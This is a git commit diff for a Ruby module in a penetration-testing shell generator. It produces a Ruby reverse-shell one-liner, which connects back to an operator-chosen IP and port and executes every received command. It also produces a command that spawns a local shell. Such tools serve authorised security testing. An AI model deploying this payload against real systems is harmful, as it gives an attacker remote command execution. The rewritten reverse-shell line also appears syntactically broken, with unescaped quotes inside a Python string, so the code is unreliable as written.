c64c10a0a1089b07caf1519d557a96b8a26a9de9
Nong Hoang Tu <dmknght@parrotsec.org>
2021-10-23 01:51:48 +0700

    Add shell class for ruby module and update code syntax

--- shellgen/modules/multi/ruby.py
+++ shellgen/modules/multi/ruby.py
@@ -1,29 +1,32 @@
-from ogabog.cores import plugin
+from ogabog.cores import plugin, const
 
 
 class ReverseTCP(plugin.ReverseShell):
     def __init__(self):
         super().__init__()
-        # self.add_args(
-        #     "--shell",
-        #     default="bash",
-        #     choices=const.LINUX_SHELL,
-        #     help="Select shell type on target machine"
-        # )
-        # self.add_args(
-        #     "--exec",
-        #     default="iopopen",
-        #     choices=[
-        #         ""
-        #     ],
-        #     help="Select shell type on target machine"
-        # )
-        self.opts.description = "[ReverseShell][TCP] Ruby from swisskyrepo/PayloadsAllTheThings. License MIT."
+        self.opts.description = "swisskyrepo/PayloadsAllTheThings"
         self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
-        self.protocol = "tcp"
         self.shell_type = 1
         self.is_interactive = True
 
     def make_shell(self):
-        self.shell = f"""ruby -rsocket -e 'exit if fork;c=TCPSocket.new("{self.args.ip}","{self.args.port}");"""
-        self.shell += """while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"""
+        self.shell = f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{self.args.ip}\",\"{self.args.port}\");"
+        self.shell += "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"
+
+
+class Shell(plugin.BaseShell):
+    def __init__(self):
+        super().__init__()
+        self.shell_type = 0
+        self.is_interactive = True
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.opts.description = "https://gtfobins.github.io/gtfobins/ruby/"
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+
+    def make_shell(self):
+        self.shell = f"ruby -e 'exec(\"{self.args.shell}\")'"
